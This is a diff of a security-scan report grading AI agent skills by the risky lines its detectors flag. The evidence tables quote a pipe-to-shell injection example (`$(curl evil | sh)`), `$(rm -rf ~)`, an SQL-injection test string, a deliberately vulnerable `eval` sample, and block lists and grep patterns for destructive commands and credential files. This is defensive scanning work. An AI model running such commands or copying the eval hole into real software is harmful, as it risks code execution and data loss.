@@ -2,45 +2,46 @@
 
 Source: https://github.com/borghei/Claude-Skills
 
-**386 skills · average 96.1/100 · scanned 2026-11-03 with scanner v1**
+**404 skills · average 95.6/100 · scanned 2026-11-10 with scanner v1**
 
-Grades: A 348 · B 17 · C 11 · D 8 · F 2
+Grades: A 358 · B 20 · C 15 · D 9 · F 2
 
 ## Capability profile
 
 | Tier | What it means | Skills |
 | :-: | --- | --: |
 | T0 text | Text in, text out. Touches nothing. | 0 |
-| T1 read | Reads files in the working directory. | 2 |
-| T2 write | Writes or edits files. | 14 |
-| T3 exec | Runs shell commands or bundled scripts. | 369 |
-| T4 remote | Executes code or instructions fetched from the network. | 1 |
+| T1 read | Reads files in the working directory. | 1 |
+| T2 write | Writes or edits files. | 15 |
+| T3 exec | Runs shell commands or bundled scripts. | 386 |
+| T4 remote | Executes code or instructions fetched from the network. | 2 |
 
 ## What fired
 
 | Detector | Skills | Share |
 | --- | --: | --: |
-| `network-egress` | 56 | 15% |
-| `dotenv-access` | 19 | 5% |
-| `unpinned-install` | 17 | 4% |
-| `destructive` | 15 | 4% |
-| `persistence` | 10 | 3% |
+| `network-egress` | 62 | 15% |
+| `destructive` | 21 | 5% |
+| `dotenv-access` | 21 | 5% |
+| `unpinned-install` | 19 | 5% |
+| `persistence` | 11 | 3% |
+| `instruction-override` | 8 | 2% |
 | `env-key-reference` | 8 | 2% |
-| `instruction-override` | 7 | 2% |
 | `secret-access` | 7 | 2% |
-| `obfuscation` | 5 | 1% |
-| `privilege-escalation` | 3 | 1% |
-| `ip-literal-url` | 2 | 1% |
+| `obfuscation` | 6 | 1% |
+| `privilege-escalation` | 5 | 1% |
+| `ip-literal-url` | 3 | 1% |
 | `conceal-from-user` | 1 | 0% |
+| `pipe-to-shell` | 1 | 0% |
 | `zero-width` | 1 | 0% |
 
-## Everything below an A (38)
+## Everything below an A (46)
 
 ### F · 0/100 · `devops-workflow-engineer`
 
 `engineering/devops-workflow-engineer` — tier 3 (exec)
 
-> Generate and optimize GitHub Actions CI/CD workflows. Use when designing workflows, planning multi-environment deployments, optimizing pipeline cost and runtime, or implementing blue- green, canary, o
+> Generate and optimize GitHub Actions CI/CD workflows. Use when designing workflows, planning multi-environment deployments, optimizing pipeline cost and runtime, or implementing blue-green, canary, or
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -51,7 +52,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **medium** | `network-egress` | `references/deployment-strategies.md:65` | fence | `curl -sf https://green.internal.example.com/health \|\| exit 1` |
 | **medium** | `network-egress` | `references/github-actions-patterns.md:537` | fence | `TOKEN=$(curl -s https://auth.example.com/token)` |
 | **medium** | `network-egress` | `scripts/deployment_planner.py:535` | plain | `lines.append(f'STATUS=$(curl -s -o /dev/null -w "%{{http_code}}" --max-time {hc["timeout_seconds"]} "$HEALTH_U` |
-| **medium** | `network-egress` | `scripts/workflow_generator.py:457` | plain | `# curl -sf "${{{{ vars.HEALTH_CHECK_URL }}}}/health" \|\| exit 1` |
+| **medium** | `network-egress` | `scripts/workflow_generator.py:460` | plain | `# curl -sf "${{{{ vars.HEALTH_CHECK_URL }}}}/health" \|\| exit 1` |
 | **low** | `env-key-reference` | `assets/cd-template.yml:94` | plain | `password: ${{ secrets.GITHUB_TOKEN }}` |
 | **low** | `unpinned-install` | `assets/ci-template.yml:74` | plain | `run: pip install ruff` |
 | **low** | `env-key-reference` | `references/github-actions-patterns.md:847` | fence | `repo-token: ${{ secrets.GITHUB_TOKEN }}` |
@@ -71,6 +72,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **medium** | `network-egress` | `references/leak-detection-and-rotation.md:134` | fence | `curl -s -o /dev/null -w "%{http_code}" \` |
 | **medium** | `network-egress` | `scripts/env_validator.py:32` | quote | `(r"^whsec_[0-9a-zA-Z]{32,}$", "Stripe Webhook Secret"),` |
 | **medium** | `network-egress` | `scripts/secret_scanner.py:36` | quote | `(re.compile(r"whsec_[0-9a-zA-Z]{32,}"), "Stripe Webhook Secret", "high"),` |
+| **low** | `env-key-reference` | `assets/sample_leaky_config.py:3` | plain | `AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"` |
 | **low** | `dotenv-access` | `references/best-practices-and-troubleshooting.md:7` | plain | `- **Committing .env to git** — add `.env` to .gitignore on day 1; use pre-commit hooks as a safety net` |
 | **low** | `env-key-reference` | `references/env-file-structure.md:37` | fence | `AWS_ACCESS_KEY_ID=               # Prefer IAM roles in production` |
 | **low** | `dotenv-access` | `references/env-file-structure.md:1` | plain | `# .env File Structure & Startup Validation` |
@@ -78,6 +80,28 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **low** | `dotenv-access` | `scripts/env_sync_checker.py:4` | plain | `Loads multiple .env files (e.g., .env.development, .env.staging, .env.production)` |
 | **low** | `dotenv-access` | `scripts/env_validator.py:2` | quote | `"""Validate .env files against .env.example — detect missing, extra, and suspicious vars.` |
 | **low** | `dotenv-access` | `SKILL.md:4` | plain | `Environment and secrets management lifecycle: .env scaffolding, validation, leak detection,` |
+
+### D · 49/100 · `human-step-wizard`
+
+`engineering/human-step-wizard` — tier 4 (remote)
+
+> Generate an interactive, resumable bash wizard that walks a person through steps only a human can do. Use when a task needs dashboard credentials, DNS or change approval, key rotation, or a manual tra
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **high** | `destructive` | `assets/wizard_runtime.sh:163` | plain | `[ "$seen" = "1" ] \|\| { rm -f "$keep"; w_die "unknown step id: $from"; }` |
+| **high** | `pipe-to-shell` | `references/bash-wizard-safety.md:53` | inline-code | `pasted `$(curl evil \| sh)`; `declare "$name=$value"` has edge cases with` |
+| **medium** | `network-egress` | `assets/sample_wizard_spec_flawed.json:2` | quote | `"title": "Rotate the payments webhook secret",` |
+| **medium** | `network-egress` | `assets/sample_wizard_spec.json:85` | quote | `"command": "curl -fsS --max-time 10 --resolve \"api.example.com:443:${NEW_LB_IP}\" https://api.example.com/hea` |
+| **medium** | `destructive` | `references/bash-wizard-safety.md:93` | inline-code | `like `PATH=/tmp/evil` or `$(rm -rf ~)` added to the file by hand is ignored.` |
+| **medium** | `network-egress` | `references/human-step-design.md:67` | plain | `\| Secret \| `secret: true` for anything that grants access: tokens, passwords, private keys, webhook secrets. H` |
+| **low** | `dotenv-access` | `assets/sample_wizard_spec.json:5` | quote | `"env_file": ".env.cutover",` |
+| **low** | `network-egress` | `references/bash-wizard-safety.md:53` | inline-code | `pasted `$(curl evil \| sh)`; `declare "$name=$value"` has edge cases with` |
+| **low** | `dotenv-access` | `references/human-step-design.md:41` | quote | `store it. Rollback text can then say "the OLD_LB_IP saved in .env.cutover"` |
+| **low** | `dotenv-access` | `scripts/wizard_generate.py:96` | quote | `f"[ -n \"$WIZARD_ENV_FILE\" ] \|\| WIZARD_ENV_FILE={q(spec.get('env_file', '.env'))}",` |
+| **low** | `dotenv-access` | `scripts/wizard_spec_validate.py:82` | quote | `env_file = spec.get("env_file", ".env")` |
+| **low** | `dotenv-access` | `SKILL.md:165` | fence | `"env_file": ".env.cutover",` |
+| **low** | `network-egress` | `SKILL.md:61` | inline-code | `- **How to verify each step from outside:** a `dig`, `curl`, `gh` or `test`` |
 
 ### D · 49/100 · `senior-data-engineer`
 
@@ -87,8 +111,8 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `destructive` | `references/data_pipeline_architecture.md:976` | fence | `self.snowflake.execute(f"TRUNCATE TABLE {table_name}")` |
-| **high** | `persistence` | `scripts/data_quality_validator.py:1366` | plain | `profile = profiler.profile(data, name=Path(args.input).stem)` |
+| **high** | `destructive` | `references/data_pipeline_architecture.md:975` | fence | `self.snowflake.execute(f"TRUNCATE TABLE {table_name}")` |
+| **high** | `persistence` | `scripts/data_quality_validator.py:1367` | plain | `profile = profiler.profile(data, name=Path(args.input).stem)` |
 | **medium** | `network-egress` | `references/dataops_best_practices.md:819` | fence | `curl -X POST ${{ secrets.SLACK_WEBHOOK }} \` |
 | **low** | `unpinned-install` | `references/dataops_best_practices.md:740` | fence | `pip install sqlfluff dbt-core dbt-snowflake` |
 
@@ -96,12 +120,12 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/senior-mobile` — tier 3 (exec)
 
-> Use when the user asks to "build a mobile app", "scaffold React Native project", "create SwiftUI views", "set up Jetpack Compose", "optimize mobile performance", "configure Expo Router navigation", "i
+> Mobile development across SwiftUI, Jetpack Compose, React Native (Expo) and Flutter: scaffolding, feature architecture, static performance checks and store listings. Use when building, optimizing or s
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
 | **high** | `privilege-escalation` | `references/ios-android-patterns.md:682` | fence | `run: sudo xcode-select -s /Applications/Xcode_15.2.app` |
-| **high** | `persistence` | `scripts/mobile_scaffold.py:781` | plain | `import {pkg}.features.profile.ProfileScreen` |
+| **high** | `persistence` | `scripts/mobile_scaffold.py:786` | plain | `import {pkg}.features.profile.ProfileScreen` |
 | **medium** | `network-egress` | `references/react-native-patterns.md:277` | fence | `const response = await fetch('https://api.example.com/products');` |
 | **medium** | `network-egress` | `scripts/app_performance_analyzer.py:322` | quote | `"axios": "axios is ~13KB. fetch() is built-in for React Native.",` |
 | **low** | `unpinned-install` | `references/ios-android-patterns.md:686` | fence | `gem install fastlane` |
@@ -110,11 +134,11 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/codex-cli-specialist` — tier 3 (exec)
 
-> OpenAI Codex CLI and cross-platform skill authoring. Use when setting up Codex CLI, converting or syncing skills between Claude Code and Codex, configuring agents/openai.yaml, or validating cross-plat
+> Converts Claude Code skills to OpenAI Codex format (agents/openai.yaml), checks dual-platform compatibility and builds a skills index. Use when porting or syncing skills to Codex, or setting up Codex 
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `destructive` | `references/codex-cli-guide.md:507` | fence | `rm -rf ~/.codex/history/` |
+| **high** | `destructive` | `references/codex-cli-guide.md:495` | fence | `rm -rf ~/.codex/history/` |
 | **high** | `persistence` | `references/codex-cli-guide.md:75` | fence | `echo 'export OPENAI_API_KEY="sk-..."' >> ~/.zshrc` |
 | **low** | `unpinned-install` | `references/best-practices-and-troubleshooting.md:14` | plain | `3. **Scripts use standard library only** - No pip install requirements for core functionality` |
 | **low** | `env-key-reference` | `references/codex-cli-guide.md:72` | fence | `export OPENAI_API_KEY="sk-..."` |
@@ -124,7 +148,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/design-auditor` — tier 3 (exec)
 
-> Audit UI/UX designs for quality, AI-generated slop, and accessibility. Use when reviewing designs, detecting slop patterns, validating WCAG compliance, checking design-token adherence, or reviewing re
+> Grade a UI (Design, AI-slop and Accessibility, A-F) and gate it in CI: batch WCAG contrast, token compliance, slop detection. Use when asked to audit, score or gate a UI; to fix one, use interface-ref
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -144,12 +168,12 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/claude-code-mastery` — tier 3 (exec)
 
-> Use when the user asks to "optimize CLAUDE.md", "create a new skill", "write a custom agent", "configure hooks", "manage context window", "set up MCP servers", "scaffold a skill package", "analyze tok
+> Optimizes CLAUDE.md files, scaffolds skills and subagents, wires hooks and measures context budget for Claude Code. Use when writing or trimming a CLAUDE.md, creating a skill, subagent or hook, or aud
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `secret-access` | `references/hooks-cookbook.md:269` | fence | `"command": "if echo \"$CLAUDE_TOOL_ARG_FILE_PATH\" \| grep -qiE '(\\.env$\|\\.env\\.\|credentials\|secrets?\|privat` |
-| **high** | `destructive` | `references/hooks-cookbook.md:289` | fence | `"command": "if echo \"$CLAUDE_TOOL_ARG_COMMAND\" \| grep -qE '(rm -rf /\|rm -rf \\*\|DROP TABLE\|DROP DATABASE\|--f` |
+| **high** | `secret-access` | `references/hooks-cookbook.md:269` | fence | `"command": "IN=$(cat); F=$(jq -r '.tool_input.file_path // empty' <<<\"$IN\"); if echo \"$F\" \| grep -qiE '(\\` |
+| **high** | `destructive` | `references/hooks-cookbook.md:289` | fence | `"command": "IN=$(cat); CMD=$(jq -r '.tool_input.command // empty' <<<\"$IN\"); if echo \"$CMD\" \| grep -qE '(r` |
 | **high** | `destructive` | `references/subagent-patterns.md:312` | fence | `"Bash(rm -rf *)",` |
 | **low** | `dotenv-access` | `scripts/context_analyzer.py:51` | quote | `"extensions": [".json", ".yaml", ".yml", ".toml", ".ini", ".cfg", ".env.example", ".gitignore"],` |
 
@@ -169,7 +193,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/release-orchestrator` — tier 3 (exec)
 
-> Orchestrate end-to-end release pipelines. Use when running pre-release validation, generating changelogs, bumping semantic versions, scoring deployment readiness, or gating releases with secret scanni
+> Gates a release from a live git checkout: preflight checks, secret scan, tag-based SemVer bump, changelog and GO/NO-GO score. Use when cutting a release from a repo (offline notes and plans from text:
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -181,7 +205,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `project-management/execution/ai-feature-prd` — tier 3 (exec)
 
-> AI/ML feature PRD scaffolding for the modern AI product manager. Use to extend a standard PRD with AI-specific sections covering model selection, evals, guardrails, failure modes, human-in-the-loop, A
+> Extends a PRD with model choice, eval and safety plan, guardrails, cost model and rollout gates for an AI or ML feature. Use when specifying any LLM, RAG, agent or ML feature, or replacing a rules-bas
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -189,11 +213,41 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **high** | `obfuscation` | `assets/failure_mode_taxonomy.md:14` | plain | `- Faithfulness eval (RAGAS or custom rubric) on golden + online samples.` |
 | **high** | `obfuscation` | `references/ai-pm-frameworks-guide.md:125` | plain | `\| **RAGAS** \| RAG-specific eval (faithfulness, context relevance) \| Any RAG feature \|` |
 
+### C · 60/100 · `computer-use-automation`
+
+`engineering/computer-use-automation` — tier 3 (exec)
+
+> Decides when a GUI-driving (computer-use) agent beats an API and lints planned screen actions for missing confirmation, verification and grounding. Use when designing a computer-use agent or reviewing
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **high** | `destructive` | `assets/sample_plan_risky.json:3` | quote | `{"type": "type", "target": "terminal", "text": "rm -rf ./build && sudo systemctl restart api"},` |
+| **high** | `privilege-escalation` | `assets/sample_plan_risky.json:3` | quote | `{"type": "type", "target": "terminal", "text": "rm -rf ./build && sudo systemctl restart api"},` |
+| **high** | `destructive` | `scripts/action_safety_linter.py:35` | quote | `r"rm\s+-rf\|drop\s+(table\|database)\|truncate\s+table\|mkfs\|format\s+[a-z]:\|shutdown\|"` |
+| **medium** | `destructive` | `SKILL.md:68` | inline-code | `**What the linter flags.** High: destructive verbs (delete, send, pay, submit...) without `confirmed`, state c` |
+
+### C · 60/100 · `git-guardrails`
+
+`engineering/git-guardrails` — tier 3 (exec)
+
+> Install a hook that blocks destructive git commands before an AI agent runs them. Use when an agent force-pushed or ran reset --hard, when adding git safety hooks, or when protecting main from agent p
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **high** | `destructive` | `assets/git_guardrails_hook.py:18` | quote | `Manual check:  python3 git_guardrails_hook.py --check "git push -f origin main"` |
+| **high** | `destructive` | `assets/sample_command_corpus.json:18` | plain | `"command": "git commit -m \"fix(api): handle null; git push -f is not run\"",` |
+| **high** | `privilege-escalation` | `assets/sample_command_corpus.json:293` | quote | `"command": "sudo git reset --hard",` |
+| **high** | `destructive` | `references/hook-mechanics.md:21` | fence | `"tool_input": {"command": "git reset --hard", "description": "Discard changes"}` |
+| **high** | `destructive` | `scripts/guardrail_test.py:13` | quote | `python3 guardrail_test.py --command "git push -f origin main" --branch feature/x` |
+| **medium** | `destructive` | `references/rule-catalog.md:24` | inline-code | `\| `reset-hard` \| `git reset --hard [ref]` \| `reset --soft`, `reset --mixed`, `reset <file>` \| `git stash push ` |
+| **medium** | `privilege-escalation` | `references/rule-catalog.md:101` | inline-code | `\| Env prefix / wrappers \| `GIT_TRACE=1 sudo git reset --hard`, `sudo -u deploy git ...`, `nice -n 10 git ...`,` |
+| **medium** | `destructive` | `SKILL.md:19` | inline-code | `An agent with shell access can run `git reset --hard`, `git clean -fdx` or` |
+
 ### C · 64/100 · `senior-ml-engineer`
 
 `engineering/senior-ml-engineer` — tier 3 (exec)
 
-> ML engineering skill for productionizing models, building MLOps pipelines, and integrating LLMs. Covers model deployment, feature stores, drift monitoring, RAG systems, and cost optimization.
+> Productionize ML models and LLM features: deployment specs, drift monitoring, RAG design and cost control. Use when deploying a model, building RAG, or monitoring drift.
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -205,14 +259,14 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/docker-development` — tier 3 (exec)
 
-> This skill should be used when the user asks to "analyze a Dockerfile", "optimize Docker layers", "validate docker-compose", "check container best practices", or "audit Docker configurations".
+> Analyse Dockerfiles and Compose files for security, image size, cache and config problems, with CI-ready exit codes. Use when reviewing or optimising a Dockerfile, validating docker-compose, or adding
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `destructive` | `references/docker-best-practices.md:58` | fence | `&& rm -rf /var/lib/apt/lists/*` |
-| **medium** | `network-egress` | `references/docker-best-practices.md:57` | fence | `&& apt-get install -y --no-install-recommends curl ca-certificates \` |
-| **medium** | `network-egress` | `scripts/dockerfile_analyzer.py:66` | quote | `(r"curl.*\\|.*sh", "Piping curl to shell is risky"),` |
-| **low** | `dotenv-access` | `references/docker-best-practices.md:96` | plain | `- Never COPY .env files or embed secrets in images` |
+| **high** | `destructive` | `references/docker-best-practices.md:59` | fence | `&& rm -rf /var/lib/apt/lists/*` |
+| **medium** | `network-egress` | `references/docker-best-practices.md:58` | fence | `&& apt-get install -y --no-install-recommends curl ca-certificates \` |
+| **medium** | `network-egress` | `scripts/dockerfile_analyzer.py:65` | quote | `(r"curl.*\\|.*sh", "Piping curl to shell is risky"),` |
+| **low** | `dotenv-access` | `references/docker-best-practices.md:97` | plain | `- Never COPY .env files or embed secrets in images` |
 
 ### C · 69/100 · `feature-flags-architect`
 
@@ -226,13 +280,13 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **medium** | `network-egress` | `references/flag-debt-and-cleanup.md:231` | fence | `curl https://flags.example.com/api/v1/flags/growth.signup_v2.enabled \` |
 | **medium** | `network-egress` | `references/flag-types-and-patterns.md:78` | fence | `return recommendations_service.fetch(user_id, timeout=200)` |
 | **medium** | `network-egress` | `references/rollout-and-kill-switch-playbook.md:233` | fence | `return recommendations_service.fetch(user_id)` |
-| **low** | `dotenv-access` | `scripts/flag_audit.py:58` | quote | `SKIP_DIRS = {".git", "node_modules", "venv", ".venv", "env", ".env", "__pycache__", "dist", "build", "target",` |
+| **low** | `dotenv-access` | `scripts/flag_audit.py:63` | quote | `SKIP_DIRS = {".git", "node_modules", "venv", ".venv", "env", ".env", "__pycache__", "dist", "build", "target",` |
 
 ### C · 69/100 · `git-worktree-manager`
 
 `engineering/git-worktree-manager` — tier 3 (exec)
 
-> Manage parallel development with Git worktrees: creation with port allocation, environment sync, branch isolation, and cleanup. Use when working multiple branches at once, running parallel CI validati
+> Run parallel Git worktrees without collisions: a port block per worktree, .env sync, health checks for stale or dirty trees, and safe cleanup of merged ones. Use when several branches or agents need r
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -241,6 +295,22 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | **low** | `dotenv-access` | `references/operations-playbook.md:12` | plain | `- **Not updating .env ports after worktree creation** — the setup script should handle this automatically` |
 | **low** | `dotenv-access` | `references/setup-and-ports.md:124` | fence | `for envfile in .env .env.local .env.development; do` |
 | **low** | `dotenv-access` | `scripts/worktree_validator.py:30` | quote | `ENV_FILES = [".env", ".env.local", ".env.development", ".env.test"]` |
+| **low** | `dotenv-access` | `SKILL.md:4` | plain | `Run parallel Git worktrees without collisions: a port block per worktree, .env sync,` |
+
+### C · 69/100 · `senior-frontend`
+
+`engineering/senior-frontend` — tier 3 (exec)
+
+> Scaffold Next.js 16 or React + Vite 8 apps, generate components with tests and stories, and flag heavy bundle dependencies. Use when starting a React project, adding components or hooks, or reviewing 
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **high** | `obfuscation` | `assets/templates/scaffold/files/auth_lib.ts:18` | plain | `for (const byte of bytes) binary += String.fromCharCode(byte);` |
+| **medium** | `network-egress` | `assets/templates/scaffold/files/api_client.ts:40` | plain | `const response = await fetch(`${baseUrl}${path}`, {` |
+| **medium** | `network-egress` | `references/code-patterns.md:67` | fence | `fetch(url).then(r => r.json()).then(setData).finally(() => setLoading(false));` |
+| **medium** | `network-egress` | `references/frontend_best_practices.md:786` | fence | `const response = await fetch('https://api.example.com/data', {` |
+| **medium** | `network-egress` | `references/nextjs_optimization_guide.md:379` | fence | `fetch('https://api.example.com/data', { cache: 'force-cache' });` |
+| **low** | `unpinned-install` | `references/nextjs_optimization_guide.md:470` | fence | `npm install @next/bundle-analyzer` |
 
 ### C · 69/100 · `stripe-integration-expert`
 
@@ -250,31 +320,43 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `persistence` | `scripts/checkout_scaffolder.py:418` | plain | `profile = request.user.profile` |
+| **high** | `persistence` | `scripts/checkout_scaffolder.py:413` | plain | `profile = request.user.profile` |
+| **medium** | `network-egress` | `assets/sample_project_sound/stripe_webhook.ts:35` | quote | `console.error("webhook processing failed", event.id, err);` |
 | **medium** | `network-egress` | `references/testing-and-troubleshooting.md:41` | plain | `\| Trusting webhook event data \| Stale data, race conditions \| Always re-fetch from Stripe API in handlers \|` |
 | **medium** | `network-egress` | `references/webhooks.md:3` | plain | `Read this when building or auditing the Stripe webhook endpoint. This is the most critical code in your billin` |
 | **medium** | `network-egress` | `scripts/checkout_scaffolder.py:5` | plain | `frameworks. Includes checkout session creation, webhook handler, subscription` |
 | **medium** | `network-egress` | `scripts/integration_auditor.py:5` | plain | `missing idempotency keys, unhandled webhook events, unpinned API versions,` |
 | **medium** | `network-egress` | `scripts/webhook_validator.py:2` | quote | `"""Stripe Webhook Endpoint Configuration Validator.` |
 | **medium** | `network-egress` | `SKILL.md:15` | plain | `frameworks: stripe-subscriptions, webhook-handling, billing-infrastructure` |
-| **low** | `dotenv-access` | `scripts/integration_auditor.py:254` | quote | `"""Check that .env files with Stripe keys are gitignored."""` |
+| **low** | `dotenv-access` | `scripts/integration_auditor.py:257` | quote | `"""Check that .env files with Stripe keys are gitignored."""` |
 
 ### C · 72/100 · `api-test-suite-builder`
 
 `engineering/api-test-suite-builder` — tier 3 (exec)
 
-> Generate API test suites from route definitions across frameworks: auth, input validation, contract, k6 load testing, mocking, and OpenAPI-driven generation. Use when adding new APIs, auditing test co
+> Generates API test skeletons from an OpenAPI spec, measures which endpoints tests really assert on, and checks response samples against the spec. Use when adding API tests, auditing API test coverage,
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
 | **high** | `destructive` | `references/route-detection-and-matrices.md:154` | fence | `name: "'; DROP TABLE projects; --",` |
 | **medium** | `network-egress` | `references/contract-and-load-testing.md:52` | fence | `const response = await fetch(`${mockServer.url}/api/v1/projects`, {` |
 
+### C · 72/100 · `bug-diagnosis`
+
+`engineering/bug-diagnosis` — tier 3 (exec)
+
+> Find the root cause of hard bugs with a fast pass/fail repro, ranked falsifiable hypotheses and bisection. Use when a bug resists quick fixes, a failure is intermittent, or a regression needs tracing 
+
+| Severity | Detector | Where | Context | Evidence |
+| --- | --- | --- | --- | --- |
+| **high** | `destructive` | `assets/repro-script-template.sh:12` | plain | `trap 'rm -rf "$WORKDIR"' EXIT` |
+| **medium** | `network-egress` | `assets/sample_debug_log.txt:9` | plain | `2026-11-02T09:14:10Z DEBUG webhook signing token=EXAMPLE0000000000000000` |
+
 ### C · 72/100 · `code-reviewer`
 
 `engineering/code-reviewer` — tier 3 (exec)
 
-> Code review automation for TypeScript, JavaScript, Python, Go, Swift, and Kotlin. Analyzes PRs for complexity, risk, SOLID violations, and code smells. Use when reviewing PRs, analyzing code quality, 
+> Heuristic code-review pre-pass for TS, JS, Python, Go, Swift and Kotlin: PR risk, smells, SOLID issues, and a two-axis (standards vs spec) review method. Use when reviewing a PR or preparing a review 
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -313,7 +395,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/senior-backend` — tier 3 (exec)
 
-> Backend development with Node.js/Express/Fastify and PostgreSQL. Use when designing REST or GraphQL APIs, optimizing database queries, implementing authentication, building microservices, handling mig
+> Builds and reviews Node.js REST APIs on PostgreSQL: OpenAPI-to-route scaffolding, schema and index analysis with migrations, HTTP load tests with a CI gate. Use when designing endpoints, fixing slow q
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -338,7 +420,7 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 `engineering/pr-review-expert` — tier 3 (exec)
 
-> Systematic PR review with blast-radius analysis, security scanning, and breaking-change and test-coverage deltas. Use when reviewing PRs that touch shared libraries, APIs, database schemas, auth, or s
+> Reviews risky PRs by blast radius: what imports the changed files, breaking API and schema changes, sensitive paths and test deltas. Use when a PR touches shared libraries, APIs, schemas or auth (for 
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -355,17 +437,18 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `obfuscation` | `scripts/security_scanner.py:120` | plain | `'eval() with potential user input'),` |
-| **low** | `dotenv-access` | `scripts/security_scanner.py:56` | plain | `'.yml', '.yaml', '.json', '.xml', '.env', '.conf', '.config'` |
+| **high** | `obfuscation` | `scripts/security_scanner.py:134` | plain | `'eval() with potential user input'),` |
+| **low** | `dotenv-access` | `scripts/security_scanner.py:61` | plain | `'.yml', '.yaml', '.json', '.xml', '.env', '.conf', '.config'` |
 
 ### B · 80/100 · `ai-security`
 
 `engineering/ai-security` — tier 3 (exec)
 
-> This skill should be used when the user asks to "scan AI systems for security threats", "check for prompt injection vulnerabilities", "assess model security posture", "detect data poisoning risks", or
+> Static scan of AI/ML code for prompt injection, unsafe model loading, data poisoning, model extraction and insecure serving, plus an agent and tool-use threat checklist. Use when reviewing an LLM app,
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
+| **high** | `obfuscation` | `assets/sample_vulnerable_app.py:24` | plain | `return {"result": eval(request.args["user_expr"])}` |
 | **high** | `obfuscation` | `scripts/ai_threat_scanner.py:220` | quote | `"eval() or exec() is called with user-controlled data, enabling remote code execution.",` |
 
 ### B · 80/100 · `business-investment-advisor`
@@ -386,24 +469,24 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
-| **high** | `persistence` | `scripts/dq_check_runner.py:398` | plain | `profile = profile_data(rows) if args.profile else None` |
+| **high** | `persistence` | `scripts/dq_check_runner.py:387` | plain | `profile = profile_data(rows) if args.profile else None` |
 
 ### B · 80/100 · `database-designer`
 
 `engineering/database-designer` — tier 3 (exec)
 
-> Database design with schema analysis, index optimization, and migration generation for PostgreSQL, MySQL, MongoDB, and DynamoDB. Use when designing schemas, optimizing queries, planning migrations, or
+> Analyse an existing SQL schema for normalization and constraint gaps, recommend indexes from query patterns, and generate forward/rollback migrations. Use when reviewing DDL, tuning indexes, or diffin
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
 | **high** | `destructive` | `expected_outputs/migration_sample.txt:37` | plain | `Rollback SQL: DROP TABLE IF EXISTS brands;` |
-| **high** | `destructive` | `migration_generator.py:495` | quote | `drop_sql = f"DROP TABLE IF EXISTS {table.name};"` |
+| **high** | `destructive` | `scripts/migration_generator.py:495` | quote | `drop_sql = f"DROP TABLE IF EXISTS {table.name};"` |
 
 ### B · 80/100 · `database-schema-designer`
 
 `engineering/database-schema-designer` — tier 3 (exec)
 
-> Design relational schemas from requirements with normalization, migrations, ERDs, RLS policies, and indexes for PostgreSQL, MySQL, and SQLite. Use when designing new features, reviewing schemas, or ad
+> Design a new relational schema from product requirements: tables, ORM models, RLS, indexes, migrations and an ERD. Use when modelling a new feature, adding multi-tenancy or soft deletes, or writing Dr
 
 | Severity | Detector | Where | Context | Evidence |
 | --- | --- | --- | --- | --- |
@@ -419,16 +502,49 @@ Grades: A 348 · B 17 · C 11 · D 8 · F 2
 | --- | --- | --- | --- | --- |
 | **high** | `persistence` | `scripts/slide_density_linter.py:240` | plain | `blocking = output(audit(slides, args.profile), slides,` |
 
+### B · 80/100 · `session-retro`
+
+`workflow/session-retro` — tier 3 (exec)
+
